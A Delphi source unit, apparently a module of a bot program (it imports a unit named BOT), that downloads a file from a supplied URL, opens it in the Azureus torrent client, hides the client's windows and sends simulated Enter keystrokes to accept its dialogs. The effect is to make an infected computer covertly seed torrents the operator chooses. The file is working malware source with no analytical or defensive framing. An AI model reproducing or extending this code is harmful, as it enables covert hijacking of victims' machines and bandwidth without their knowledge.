unit azureusSeeder;

interface

uses WINDOWS, Threadunit, urlmon, shellapi, strings;


var
  AzWindow: HWND;
  popupwindow: String;


function EnumWindowsFunc(Handle: HWND; String123: String): boolean; stdcall;
procedure StartAzureus(Link, SaveAs: String; sleepseconds: Integer);
implementation
uses BOT;

function EnumWindowsFunc(Handle: HWND; String123: String) : boolean ; stdcall;
var
  caption: array[0..256] of Char;
begin
 if GetWindowText(Handle, Caption, SizeOf(Caption)-1) <> 0 then
 begin
  if pos(azchar1, caption) <> 0 then
  begin
  Result := True;
  azWindow := Handle;
  end;

 end;

 result :=True;
end;



function findpopup: HWND;
begin
  if EnumWindows(@EnumWindowsFunc, LParam(popupwindow)) = TRUE then
  begin
  Result := azWindow;
  end;
end;



procedure SeedAzureus(Link, SaveAS: String; sleepseconds: INteger);
var
  i: Integer;
  dlbool : Boolean;
  hAzureus, hPopup, hExists, hOpenTorrent: HWND;
begin
  hAzureus := FindWindow(NIL, PChar(azchar2));
 // if hAzureus <> 0 then
  begin
   URLDownloadToFile(nil, PChar(Link), Pchar(Saveas), 0, nil);
   Sleep(SleepSeconds * 1000);
    begin
      i :=  ShellExecute(0, PChar(open), PChar(SaveAs), NIL, 0, SW_NORMAL);
     // if i <= 32 then
      begin
    //////////////////////////////
        for i := 0 to 9 do begin
          hExists := FindWindow( 0, PChar(azchar3));
          if hExists <> 0 then
          begin
            ShowWindow(hExists, SW_HIDE);  
          end;
          Sleep(100);
        end;
    ////////////////////////////
        for i := 0 to 9 do begin
          hPopup := FindWindow( 0, PChar(azchar4));
          Sleep(100);
        end;
    ////////////////////////////
      (*  if hPopup <> 0 then     *)
        begin
          azWindow := findpopup;
          BringWindowToTop(azWindow);
          SetForegroundWindow(azwindow);
          setfocus(azwindow);
          sleep(300);
          Keybd_Event(VK_RETURN,0,0,0); //Taste drücken
          Keybd_Event(VK_RETURN,0,KEYEVENTF_KEYUP,0); //Taste loslassen
          sleep(20);
          Keybd_Event(VK_RETURN,0,0,0); //Taste drücken
          Keybd_Event(VK_RETURN,0,KEYEVENTF_KEYUP,0); //Taste loslassen
          ShowWindow(azwindow, SW_MINIMIZE);
          showWindow(hazureus, SW_MINIMIZE);
        end;
      end;
    end;
  end;
end;

procedure StartAzureus(Link, SaveAs: String; sleepseconds: Integer);
begin
  SeedAzureus(Link, SaveAS, sleepseconds);
end;

end.
